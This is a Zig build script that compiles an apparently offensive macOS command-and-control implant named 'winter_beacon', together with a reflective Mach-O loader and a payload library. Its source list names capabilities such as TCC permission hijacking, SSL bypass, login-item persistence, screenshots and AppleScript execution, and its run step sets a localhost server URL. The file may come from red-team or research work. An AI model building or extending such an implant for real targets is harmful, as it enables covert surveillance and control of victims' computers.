const std = @import("std");

pub fn build(b: *std.Build) void {
    // Standard target options
    const target = b.standardTargetOptions(.{});
    const optimize = b.standardOptimizeOption(.{});

    // Loader library
    const loader_lib = b.addStaticLibrary(.{
        .name = "loader",
        .target = target,
        .optimize = optimize,
    });

    // Add loader source files
    loader_lib.addCSourceFiles(.{
        .files = &.{
            "loader/src/ImageLoader.cpp",
            "loader/src/ImageLoaderMachO.cpp",
            "loader/src/ImageLoaderMachOCompressed.cpp",
            "loader/src/ImageLoaderProxy.cpp",
            "loader/src/custom_dlfcn.cpp",
            "loader/src/dyld_stubs.cpp",
        },
        .flags = &.{
            "-std=c++11",
            "-DUNSIGN_TOLERANT=1",
        },
    });

    // Add loader include directories
    loader_lib.root_module.addIncludePath(.{ .cwd_relative = "loader/include" });
    loader_lib.root_module.addIncludePath(.{ .cwd_relative = "loader/src" });

    // Link with system libraries
    loader_lib.linkLibC();
    loader_lib.linkLibCpp();

    // Install the loader library
    b.installArtifact(loader_lib);

    // Payload dynamic library
    const payload_lib = b.addSharedLibrary(.{
        .name = "payload",
        .target = target,
        .optimize = optimize,
    });

    // Add payload source file
    payload_lib.addCSourceFiles(.{
        .files = &.{
            "payload.m",
        },
        .flags = &.{
            "-fPIC",
            "-mmacosx-version-min=13.0",
        },
    });

    // Link Foundation framework for payload
    payload_lib.linkFramework("Foundation");
    payload_lib.linkLibC();

    // Install the payload library
    b.installArtifact(payload_lib);

    // Beacon executable
    const beacon = b.addExecutable(.{
        .name = "winter_beacon",
        .target = target,
        .optimize = optimize,
    });

    // Add beacon source files
    beacon.addCSourceFiles(.{
        .files = &.{
            "main.m",
            "ZBeacon.m",
            "ZAPIClient.m",
            "ZCommandPoller.m",
            "ZCommandRegistry.m",
            "ZCommandHandler.m",
            "ZCommandService.m",
            "ZCommandExecutor.m",
            "ZCommandReporter.m",
            "ZSystemInfo.m",
            "ZSSLBypass.m",
            "ZCommandModel.m",
            "commands/ZEchoCommandHandler.m",
            "commands/ZDialogCommandHandler.m",
            "commands/ZWhoAmICommandHandler.m",
            "commands/ZTCCJackCommandHandler.m",
            "commands/ZLoginItemCommandHandler.m",
            "commands/ZTCCCheckCommandHandler.m",
            "commands/ZScreenshotCommandHandler.m",
            "commands/ZLSCommandHandler.m",
            "commands/ZPWDCommandHandler.m",
            "commands/ZAppleScriptCommandHandler.m",
            "commands/ZReflectiveCommandHandler.m",
        },
        .flags = &.{
            "-fno-objc-arc",
            "-mmacosx-version-min=13.0",
            "-ObjC",
        },
    });

    // Add beacon include paths
    beacon.root_module.addIncludePath(.{ .cwd_relative = "." }); // Add root directory for finding headers
    beacon.root_module.addIncludePath(.{ .cwd_relative = "commands" }); // Add commands directory
    beacon.root_module.addIncludePath(.{ .cwd_relative = "loader/include" }); // Add loader's include directory
    beacon.root_module.addIncludePath(.{ .cwd_relative = "loader/include/mach-o" }); // Add mach-o headers

    // Link with system libraries
    beacon.linkLibC();

    // Add beacon frameworks
    beacon.linkFramework("Foundation");
    beacon.linkFramework("Security");
    beacon.linkFramework("AppKit");
    beacon.linkFramework("ScreenCaptureKit");
    beacon.linkFramework("CoreMedia");
    beacon.linkFramework("CoreImage");

    // Link with loader library
    beacon.linkLibrary(loader_lib);

    // Install the beacon executable
    b.installArtifact(beacon);

    // Create a "run" step
    const run_cmd = b.addRunArtifact(beacon);
    run_cmd.step.dependOn(b.getInstallStep());

    // Add default URL parameter
    run_cmd.addArgs(&.{"--url=https://localhost:4444"});

    // Allow additional args from command line
    if (b.args) |args| {
        run_cmd.addArgs(args);
    }

    const run_step = b.step("run", "Run the beacon");
    run_step.dependOn(&run_cmd.step);

    // Create a "test" step
    const test_step = b.step("test", "Run tests");
    test_step.dependOn(&run_cmd.step);

    // Create a clean step
    const clean_step = b.addRemoveDirTree("zig-out");
    const clean = b.step("clean", "Clean build artifacts");
    clean.dependOn(&clean_step.step);
}
